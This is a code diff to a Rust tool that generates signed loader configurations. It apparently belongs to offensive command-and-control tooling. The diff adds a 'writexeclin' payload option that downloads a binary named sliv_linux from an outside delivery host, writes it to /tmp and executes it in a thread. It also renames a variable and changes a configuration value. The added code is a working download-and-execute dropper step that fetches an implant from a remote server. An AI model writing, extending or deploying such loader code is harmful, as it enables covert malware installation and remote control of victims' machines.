@@ -71,9 +71,25 @@ fn main() {
     if payload == "banner".to_string() {
         info!("[+] Loader type choice: Banner");
         payload_choice = vec![Payload::Banner()];
-    } else if payload == "lindlexec".to_string() {
-        info!("[+] Loader type choice: DownloadAndExec linux");
-        todo!();
+    } else if payload == "writexeclin".to_string() {
+        info!("[+] Loader type choice: WriteFile+Exec linux");
+        payload_choice = vec![
+            Payload::WriteFile(WriteFile {
+                link: Link::HTTP(HTTPLink {
+                    url: String::from("https://delivery.flameshot.space/nologin/sliv_linux"),
+                    dataoperation: vec![],
+                    jitt: 0,
+                    sleep: 0,
+                }),
+                path: "/tmp/sliv_linux".to_string(),
+                hash: "".to_string() 
+            }),
+            Payload::Exec(Exec {
+                path: "/tmp/sliv_linux".to_string(),
+                cmdline:"".to_string(),
+                thread:true
+            }),
+        ];
         /*
         payload_choice = vec![Payload::DownloadAndExec(DownloadAndExec {
             link: Link::HTTP(HTTPLink {
@@ -330,7 +346,7 @@ exec(decoded_script)
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
     let key_pair_ed25519: Ed25519KeyPair = fromfile_master_keypair(&keypair);
 
-    let loaderconf = Config::new_signed(
+    let config = Config::new_signed(
         &key_pair_ed25519,
         solar_distance,
         payload_choice,
@@ -352,14 +368,14 @@ exec(decoded_script)
                 operator: Operator::AND,
             }),
         ],
-        0,
+        5,
         0,
     );
     //info!("{:?}", loaderconf);
     info!("[+] SIGN loader");
 
     info!("[+] Serialized loader configuration: {json_file}");
-    loaderconf.serialize_to_file_pretty(&json_file);
+    config.serialize_to_file_pretty(&json_file);
 
-    initialize_loader(loaderconf, json_file);
+    initialize_loader(config, json_file);
 }
